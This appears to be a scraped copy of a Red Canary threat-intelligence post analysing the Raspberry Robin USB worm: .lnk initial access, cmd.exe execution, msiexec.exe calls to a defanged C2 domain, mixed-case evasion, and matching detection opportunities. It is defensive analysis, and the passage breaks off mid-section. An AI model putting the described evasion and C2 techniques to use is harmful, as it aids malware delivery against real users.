{
    "id": "<report_0xb609744c>",
    "url": "https://redcanary.com/blog/raspberry-robin",
    "title": "Raspberry Robin gets the worm early",
    "meta": [
        {
            "id": "<chapter_0xaacc5aa1>",
            "title": "Raspberry Robin gets the worm early",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x2ea83af3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Red Canary is tracking a worm spread by external drives that leverages Windows Installer to reach out to QNAP-associated domains and download a malicious DLL.",
                    "html": "<p>Red Canary is tracking a worm spread by external drives that leverages Windows Installer to reach out to QNAP-associated domains and download a malicious DLL.</p>"
                },
                {
                    "id": "<sentence_0x63267b5a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "May 5, 2022",
                    "html": " May 5, 2022"
                },
                {
                    "id": "<sentence_0x4b16f71>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Initial access",
                    "html": "<p>Initial access</p>"
                },
                {
                    "id": "<sentence_0x659adb90>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Execution",
                    "html": "<p>Execution</p>"
                },
                {
                    "id": "<sentence_0x46f6eb2a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Command and control (C2)",
                    "html": "<p>Command and control (C2)</p>"
                },
                {
                    "id": "<sentence_0xd4570718>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x12af385a>": "msiexec.exe",
                        "<code_0x25aa7df1>": "msiexec.exe"
                    },
                    "text": "Detection opportunity: msiexec.exe downloading and executing packages<crlf>Identify the use of Windows Installer Tool msiexec.exe to download and execute<crlf>packages in the CLI.",
                    "html": "<p>Detection opportunity: <code>msiexec.exe</code> downloading and executing packages\n Identify the use of Windows Installer Tool <code>msiexec.exe</code> to download and execute\n packages in the CLI.</p>"
                },
                {
                    "id": "<sentence_0x8ccefa2f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Persistence",
                    "html": "<p>Persistence</p>"
                },
                {
                    "id": "<sentence_0x2bb05d6c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Execution (again)",
                    "html": "<p>Execution (again)</p>"
                },
                {
                    "id": "<sentence_0x2f8a977a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x5110139e>": "odbcconf.exe"
                    },
                    "text": "Detection opportunity: odbcconf.exe loading .DLLs",
                    "html": "<p>Detection opportunity: <code>odbcconf.exe</code> loading .DLLs</p>"
                },
                {
                    "id": "<sentence_0x47e21e5c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "C2, part deux",
                    "html": "<p>C2, part deux</p>"
                },
                {
                    "id": "<sentence_0xa3414959>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Detection opportunity: network connections from the command line with no parameters",
                    "html": "<p>Detection opportunity: network connections from the command line with no parameters</p>"
                },
                {
                    "id": "<sentence_0xec19988d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Intelligence gaps",
                    "html": "<p>Intelligence gaps</p>"
                },
                {
                    "id": "<sentence_0x7a1ee00a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Appendix",
                    "html": "<p>Appendix</p>"
                },
                {
                    "id": "<sentence_0x5acd2e94>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Intelligence Insights: April 2022",
                    "html": "<p class=\"title\">Intelligence Insights: April 2022</p>"
                },
                {
                    "id": "<sentence_0xf07c89b8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Better know a data source: Access tokens (and why theyre hard to get)",
                    "html": "<p class=\"title\">Better know a data source: Access tokens (and why they\u2019re hard to get)</p>"
                },
                {
                    "id": "<sentence_0xcf4c7493>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Unwrapping the 2022 Threat Detection Report",
                    "html": "<p class=\"title\">Unwrapping the 2022 Threat Detection Report</p>"
                },
                {
                    "id": "<sentence_0xf9b297d3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Intelligence Insights: March 2022",
                    "html": "<p class=\"title\">Intelligence Insights: March 2022</p>"
                },
                {
                    "id": "<sentence_0xf4431c05>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Subscribe to our blog",
                    "html": "<p class=\"titleForm-title\"> Subscribe to our blog</p>"
                },
                {
                    "id": "<sentence_0xbaa182ab>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "See what it's like to have a partner in the fight.",
                    "html": "<p class=\"title\">See what it's like to have a partner in the fight.</p>"
                },
                {
                    "id": "<sentence_0x490fc84d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xb24695d4>": "https://redcanary.com/demo"
                    },
                    "text": "Demo",
                    "html": "<a class=\"cta-box red\" href=\"/demo\">Demo </a>"
                },
                {
                    "id": "<sentence_0xde14f877>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "All 2021 Threat Detection Report content is fully available through this website. If you prefer to download a PDF, just fill out this form and let us know what email to send it to.",
                    "html": "<p>All 2021 Threat Detection Report content is fully available through this website. If you prefer to download a PDF, just fill out this form and let us know what email to send it to.</p>"
                },
                {
                    "id": "<sentence_0x8d88060>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0xbcf45ff9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "*First Name:*Last Name:*Email Address:*Company Name:*Country:",
                    "html": "*First Name:*Last Name:*Email Address:*Company Name:*Country:"
                },
                {
                    "id": "<sentence_0x393e1819>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0xe7f0f015>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Thanks for your interest!",
                    "html": "<p>Thanks for your interest!</p>"
                },
                {
                    "id": "<sentence_0x63bb5607>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Check your inbox, the 2021 Threat Detection Report is headed your way.",
                    "html": "<p>Check your inbox, the 2021 Threat Detection Report is headed your way.</p>"
                },
                {
                    "id": "<sentence_0x5641d153>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Our website uses cookies to provide you with a better browsing experience. More information can be found in our",
                    "html": " Our website uses cookies to provide you with a better browsing experience. More information can be found in our "
                },
                {
                    "id": "<sentence_0x34d5563>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc68c71af>": "https://redcanary.com/privacy-policy"
                    },
                    "text": "Privacy Policy",
                    "html": "<a href=\"/privacy-policy\">Privacy Policy</a>"
                },
                {
                    "id": "<sentence_0x469a3b86>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": ".",
                    "html": ".\n "
                },
                {
                    "id": "<sentence_0x91ba39c1>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"cli-plugin-main-button cookie_action_close_header cli_action_button\" id=\"cookie_action_close_header\">X</a>"
                },
                {
                    "id": "<sentence_0x68a1a419>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Privacy & Cookies Policy",
                    "html": "Privacy & Cookies Policy "
                },
                {
                    "id": "<sentence_0x1d2c4a05>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Privacy Overview",
                    "html": "<p>Privacy Overview</p>"
                },
                {
                    "id": "<sentence_0x4c79da09>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities...",
                    "html": "This website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities... "
                },
                {
                    "id": "<sentence_0x6488fce8>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"cli-privacy-readmore\"></a>"
                },
                {
                    "id": "<sentence_0x2b0b1efd>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"cli-nav-link cli-settings-mobile\" tabindex=\"0\"> Necessary </a>"
                },
                {
                    "id": "<sentence_0xd34d8aff>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Necessary Always Enabled Necessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.",
                    "html": " Necessary Always Enabled Necessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information. "
                },
                {
                    "id": "<sentence_0xb677811b>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"cli-nav-link cli-settings-mobile\" tabindex=\"0\"> Non-necessary </a>"
                },
                {
                    "id": "<sentence_0xcd614b15>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Non-necessary Any cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website.",
                    "html": " Non-necessary Any cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website. "
                },
                {
                    "id": "<sentence_0x81349d9f>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a class=\"wt-cli-privacy-btn cli_setting_save_button wt-cli-privacy-accept-btn cli-btn\" id=\"wt-cli-privacy-save-btn\" tabindex=\"0\">SAVE &amp; ACCEPT</a>"
                }
            ]
        }
    ],
    "chapters": [
        {
            "id": "<chapter_0xa06a2250>",
            "title": "Raspberry Robin gets the worm early",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xe970b62e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Over the past several months, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Read on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how we decided to cluster this activity.",
                    "html": "<p>Over the past several months, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Read on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how we decided to cluster this activity.</p>"
                },
                {
                    "id": "<sentence_0x96b3daa4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x513a1def>": "msiexec.exe"
                    },
                    "text": "Raspberry Robin is Red Canarys name for a cluster of activity we first observed in September 2021 involving a worm that is often installed via USB drive. This activity cluster relies on msiexec.exe to call out to its infrastructure, often compromised QNAP devices, using HTTP requests that contain a victims user and device names. We also observed Raspberry Robin use TOR exit nodes as additional command and control (C2) infrastructure.",
                    "html": "<p>\u201cRaspberry Robin\u201d is Red Canary\u2019s name for a cluster of activity we first observed in September 2021 involving a worm that is often installed via USB drive. This activity cluster relies on <code>msiexec.exe</code> to call out to its infrastructure, often compromised QNAP devices, using HTTP requests that contain a victim\u2019s user and device names. We also observed Raspberry Robin use TOR exit nodes as additional command and control (C2) infrastructure.</p>"
                },
                {
                    "id": "<sentence_0x9b8e1f4a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x32445346>": "https://redcanary.com/authors/jason-killam/",
                        "<a_0x6bb4d746>": "https://www.virustotal.com/gui/collection/cea528052dc6137b9ec1f2b03342921894fd0bb3b21209320bfdcb4ff7d27fb8"
                    },
                    "text": "Like most activity clusters we track, Raspberry Robin began as a handful of detections with similar characteristics that we saw in multiple customers environments, first noticed by Jason Killam from Red Canarys Detection Engineering team. We saw Raspberry Robin activity as far back as September 2021, though most related activity occurred during or after January 2022. As we observed additional activity, we couldnt find public reporting to corroborate our analysis, aside from some findings on VirusTotal that we suspected were related based on overlap in C2 domains.",
                    "html": "<p>Like most activity clusters we track, Raspberry Robin began as a handful of detections with similar characteristics that we saw in multiple customers\u2019 environments, first noticed by <a href=\"https://redcanary.com/authors/jason-killam/\" rel=\"noopener noopener\" target=\"_blank\">Jason Killam</a> from Red Canary\u2019s Detection Engineering team. We saw Raspberry Robin activity as far back as September 2021, though most related activity occurred during or after January 2022. As we observed additional activity, we couldn\u2019t find public reporting to corroborate our analysis, aside from <a href=\"https://www.virustotal.com/gui/collection/cea528052dc6137b9ec1f2b03342921894fd0bb3b21209320bfdcb4ff7d27fb8\" rel=\"noopener noopener\" target=\"_blank\">some findings on VirusTotal</a> that we suspected were related based on overlap in C2 domains.</p>"
                },
                {
                    "id": "<sentence_0xc6c06b47>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "To date, weve observed Raspberry Robin in organizations with ties to technology and manufacturing, though its not yet clear if there are other links among victims. We have several intelligence gaps around this cluster, including the operators objectives. While we dont yet have the full picture, we want to share what we know about this activity cluster so far to enrich collective understanding of this threat and empower defenders to identify this activity. We use the cluster name Raspberry Robin to refer to the entire chain of activity described below, including the initial access method, the worm itself, and the follow-on execution and C2 activity.",
                    "html": "<p>To date, we\u2019ve observed Raspberry Robin in organizations with ties to technology and manufacturing, though it\u2019s not yet clear if there are other links among victims. We have several intelligence gaps around this cluster, including the operators\u2019 objectives. While we don\u2019t yet have the full picture, we want to share what we know about this activity cluster so far to enrich collective understanding of this threat and empower defenders to identify this activity. We use the cluster name \u201cRaspberry Robin\u201d to refer to the entire chain of activity described below, including the initial access method, the worm itself, and the follow-on execution and C2 activity.</p>"
                },
                {
                    "id": "<sentence_0x67329a94>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Below weve provided a comprehensive analysis of known Raspberry Robin behavior with corresponding detection opportunities along the way.",
                    "html": "<p>Below we\u2019ve provided a comprehensive analysis of known Raspberry Robin behavior with corresponding detection opportunities along the way.</p>"
                },
                {
                    "id": "<sentence_0x6cf980f7>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31221\" height=\"718\" src=\"\" width=\"2560\"/>"
                },
                {
                    "id": "<sentence_0x74f11540>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x3bedca91>": "https://redcanary.com/wp-content/uploads/2022/05/RRGraphicV3-scaled.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31221\" height=\"718\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRGraphicV3-scaled.jpg\" width=\"2560\"/>"
                },
                {
                    "id": "<sentence_0x556dc0e1>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0xd8429d53>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 1: Raspberry Robin event outline",
                    "html": "<p>Figure 1: Raspberry Robin event outline</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xd659ca76>",
            "title": "Initial access",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x2c7372b5>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xfb237f88>": ".lnk"
                    },
                    "text": "Raspberry Robin is typically introduced via infected removable drives, often USB devices. The Raspberry Robin worm often appears as a shortcut .lnk file masquerading as a legitimate folder on the infected USB device.",
                    "html": "<p>Raspberry Robin is typically introduced via infected removable drives, often USB devices. The Raspberry Robin worm often appears as a shortcut <code>.lnk</code> file masquerading as a legitimate folder on the infected USB device.</p>"
                },
                {
                    "id": "<sentence_0x1449e945>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa9889226>": ".lnk",
                        "<code_0xba240f47>": "q:\\erpbirel.yax",
                        "<code_0x26452446>": "d:\\recovery.lnk"
                    },
                    "text": "Soon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry entry is updated and records execution of a ROT13-ciphered value referencing a .lnk file when deciphered. In the example below, q:\\erpbirel.yax deciphers to d:\\recovery.lnk.",
                    "html": "<p>Soon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry entry is updated and records execution of a ROT13-ciphered value referencing a <code>.lnk</code> file when deciphered. In the example below, <code>q:\\erpbirel.yax</code> deciphers to <code>d:\\recovery.lnk</code>.</p>"
                },
                {
                    "id": "<sentence_0x1807aff6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31208\" height=\"1063\" src=\"\" width=\"2236\"/>"
                },
                {
                    "id": "<sentence_0x7e1ac1ce>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x91bbbc2a>": "https://redcanary.com/wp-content/uploads/2022/05/RRFigure2.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31208\" height=\"1063\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRFigure2.jpg\" width=\"2236\"/>"
                },
                {
                    "id": "<sentence_0x7ac08613>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xdb9b7918>": ".lnk"
                    },
                    "text": "Figure 2: Registry modification with ROT13 .lnk file",
                    "html": "<p>Figure 2: Registry modification with ROT13 <code>.lnk</code> file</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xc6ba0db1>",
            "title": "Execution",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xb8bcd8c8>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x7ea4b8c>": "cmd.exe",
                        "<code_0xe568ab97>": "cmd /R <",
                        "<code_0xe02aaf0>": "cmd /R <",
                        "<code_0x5d3adc03>": ".usb",
                        "<code_0x6f410216>": "ico",
                        "<code_0xce1f386a>": ".lnk",
                        "<code_0x2617a98e>": ".bin",
                        "<code_0x9b84ef08>": "sv",
                        "<code_0x3978632>": ".lo"
                    },
                    "text": "Raspberry Robin first uses cmd.exe to read and execute a file stored on the infected external drive. The command is consistent across Raspberry Robin detections we have seen so far, making it reliable early evidence of potential Raspberry Robin activity. Typically the command line includes cmd /R < to read and execute a file. The use of cmd /R < is not unique to Raspberry Robin, but the filename pattern is unique. The filename is made up of five to seven random alphanumeric characters and a variety of file extensions. Some of the file extensions weve seen include .usb, ico, .lnk, .bin, .sv, and .lo. Additionally, the command has sometimes included type, which is a built-in command to display the contents of a file.",
                    "html": "<p>Raspberry Robin first uses <code>cmd.exe</code> to read and execute a file stored on the infected external drive. The command is consistent across Raspberry Robin detections we have seen so far, making it reliable early evidence of potential Raspberry Robin activity. Typically the command line includes <code>cmd /R &lt;</code> to read and execute a file. The use of <code>cmd /R &lt;</code> is not unique to Raspberry Robin, but the filename pattern is unique. The filename is made up of five to seven random alphanumeric characters and a variety of file extensions. Some of the file extensions we\u2019ve seen include <code>.usb</code>, <code>ico</code>, <code>.lnk</code>, <code>.bin</code>, .<code>sv</code>, and <code>.lo</code>. Additionally, the command has sometimes included type, which is a built-in command to display the contents of a file.</p>"
                },
                {
                    "id": "<sentence_0x6b3fccb3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Heres an example of what the whole command might look like:",
                    "html": "<p>Here\u2019s an example of what the whole command might look like:</p>"
                },
                {
                    "id": "<sentence_0xa8dd648e>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31207\" height=\"468\" src=\"\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0xabd7b14f>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xc1abfa65>": "https://redcanary.com/wp-content/uploads/2022/05/RRFigure3-scaled.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31207\" height=\"468\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRFigure3-scaled.jpg\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0x8b4105a5>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x8b278c6f>": "cmd.exe"
                    },
                    "text": "Figure 3: Raspberry Robin cmd.exe command",
                    "html": "<p>Figure 3: Raspberry Robin <code>cmd.exe</code> command</p>"
                },
                {
                    "id": "<sentence_0xfdb6d081>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x26516348>": "cmd.exe",
                        "<code_0x2be89bda>": "explorer.exe",
                        "<code_0x7ce50c52>": "msiexec.exe",
                        "<code_0xce56015d>": "explorer.exe",
                        "<code_0x651997c8>": "LAUREN V",
                        "<code_0xfa63f358>": ".lnk",
                        "<code_0x954665f0>": ".lnk",
                        "<code_0x8a8791ed>": "LNkFILe"
                    },
                    "text": "Next, cmd.exe typically launches explorer.exe and msiexec.exe. With Raspberry Robin, explorer.exes command line can be a mixed-case reference to an external device; a persons name, like LAUREN V; or the name of the .lnk file, like the figure below. The name here has been modified from the .lnk file name to LNkFILe. While we arent sure of this commands exact purpose, weve consistently observed it in Raspberry Robin detections.",
                    "html": "<p>Next, <code>cmd.exe</code> typically launches <code>explorer.exe</code> and <code>msiexec.exe</code>. With Raspberry Robin, <code>explorer.exe</code>\u2019s command line can be a mixed-case reference to an external device; a person\u2019s name, like <code>LAUREN V</code>; or the name of the <code>.lnk</code> file, like the figure below. The name here has been modified from the <code>.lnk</code> file name to <code>LNkFILe</code>. While we aren\u2019t sure of this command\u2019s exact purpose, we\u2019ve consistently observed it in Raspberry Robin detections.</p>"
                },
                {
                    "id": "<sentence_0x965fb7af>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31206\" height=\"639\" src=\"\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0xd285542>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x1a0cefa>": "https://redcanary.com/wp-content/uploads/2022/05/RRFigure4A.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31206\" height=\"639\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRFigure4A.jpg\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0x634ffdba>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31205\" height=\"626\" src=\"\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0x43bd5d11>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x8bf51448>": "https://redcanary.com/wp-content/uploads/2022/05/RRFigure4B.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31205\" height=\"626\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRFigure4B.jpg\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0xb3ce6bea>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Figure 4: Mixed-case command referring to device or name",
                    "html": "<p>Figure 4: Mixed-case command referring to device or name</p>"
                },
                {
                    "id": "<sentence_0xf5e27341>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9f0cb6cb>": "evil",
                        "<code_0x494f8225>": "eViL",
                        "<code_0x195d830b>": "cmd.exe"
                    },
                    "text": "Raspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use mixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written to detect evil may not fire on eViL, but cmd.exe is case-insensitive and has the flexibility to read and process both commands the same way.",
                    "html": "<p>Raspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use mixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written to detect <code>evil</code> may not fire on <code>eViL</code>, but <code>cmd.exe</code> is case-insensitive and has the flexibility to read and process both commands the same way.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1e0515f9>",
            "title": "Command and control (C2)",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x54f7bee7>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x335d0c58>": "msiexec.exe"
                    },
                    "text": "Lets look at Raspberry Robins msiexec.exe command in detail, since that informs our first behavior-based detection opportunity.",
                    "html": "<p>Let\u2019s look at Raspberry Robin\u2019s <code>msiexec.exe</code> command in detail, since that informs our first behavior-based detection opportunity.</p>"
                },
                {
                    "id": "<sentence_0x2d30e8d0>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xefb2d30b>": "msiexec.exe",
                        "<code_0x3cfff45a>": "msiexec.exe"
                    },
                    "text": "While msiexec.exe downloads and executes legitimate installer packages, adversaries also leverage it to deliver malware. Raspberry Robin uses msiexec.exe to attempt external network communication to a malicious domain for C2 purposes. The command line has several key features we have seen across multiple detections:",
                    "html": "<p>While <code>msiexec.exe</code> downloads and executes legitimate installer packages, adversaries also leverage it to deliver malware. Raspberry Robin uses <code>msiexec.exe</code> to attempt external network communication to a malicious domain for C2 purposes. The command line has several key features we have seen across multiple detections:</p>"
                },
                {
                    "id": "<sentence_0x47213076>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Use of mixed-case syntax (this is yet another example of mixed case use by Raspberry Robin)<crlf>Use of short, recently-registered domains only containing a few characters, for example v0[.]cx<crlf>The domains in our detections hosted QNAP NAS device login pages around the time of the Raspberry Robin activity. We hypothesize Raspberry Robin may use compromised QNAP devices for C2 infrastructure. The use of (ostensibly) compromised QNAP devices for C2 infrastructure is not unique to this activity cluster, but we observed operators using these across several Raspberry Robin-associated detections.<crlf>Inclusion of port 8080, a non-standard HTTP web service port, in the URL<crlf>Inclusion of a string of random alphanumeric characters as the URL subdirectory, frequently followed by the victims hostname and username",
                    "html": "<ul><li>Use of mixed-case syntax (this is yet another example of mixed case use by Raspberry Robin)</li><li>Use of short, recently-registered domains only containing a few characters, for example <code>v0[.]cx</code></li><li>The domains in our detections hosted QNAP NAS device login pages around the time of the Raspberry Robin activity. We hypothesize Raspberry Robin may use compromised QNAP devices for C2 infrastructure. The use of (ostensibly) compromised QNAP devices for C2 infrastructure is not unique to this activity cluster, but we observed operators using these across several Raspberry Robin-associated detections.</li><li>Inclusion of port <code>8080</code>, a non-standard HTTP web service port, in the URL</li><li>Inclusion of a string of random alphanumeric characters as the URL subdirectory, frequently followed by the victim\u2019s hostname and username</li></ul>"
                },
                {
                    "id": "<sentence_0x691a133a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x2cd76cfd>": "msiexec.exe",
                        "<code_0x4ae70f49>": "HOSTNAME"
                    },
                    "text": "Here is a modified example of a full malicious Raspberry Robin msiexec.exe command line matching all of the above criteria. The random string has been modified, and the victims host name replaced with HOSTNAME, though the domain name remains the original one observed.",
                    "html": "<p>Here is a modified example of a full malicious Raspberry Robin <code>msiexec.exe</code> command line matching all of the above criteria. The random string has been modified, and the victim\u2019s host name replaced with <code>HOSTNAME</code>, though the domain name remains the original one observed.</p>"
                },
                {
                    "id": "<sentence_0x4414210a>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31204\" height=\"417\" src=\"\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0xa43c35b6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xa79e1be9>": "https://redcanary.com/wp-content/uploads/2022/05/RRFigure5-scaled.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31204\" height=\"417\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRFigure5-scaled.jpg\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0x23f7def1>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9b4a7918>": "msiexec.exe"
                    },
                    "text": "Figure 5: Malicious Raspberry Robin msiexec.exe command",
                    "html": "<p>Figure 5: Malicious Raspberry Robin <code>msiexec.exe</code> command</p>"
                },
                {
                    "id": "<sentence_0x3c0d0b8>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xc7519a68>": "msiexec.exe",
                        "<code_0xfdc52700>": "msiexec.exe"
                    },
                    "text": "To detect suspicious use of msiexec.exe by Raspberry Robin or other threats, its essential to take a look at the command line and the URL. Detecting msiexec.exe making outbound network connections to download and install packages in the command line interface will give you the opportunity to examine the activity and determine if its malicious or not.",
                    "html": "<p>To detect suspicious use of <code>msiexec.exe</code> by Raspberry Robin or other threats, it\u2019s essential to take a look at the command line and the URL. Detecting <code>msiexec.exe</code> making outbound network connections to download and install packages in the command line interface will give you the opportunity to examine the activity and determine if it\u2019s malicious or not.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x60916eea>",
            "title": "Detection opportunity: msiexec.exe downloading and executing packages Identify the use of Windows Installer Tool msiexec.exe to download and execute packages in the CLI.",
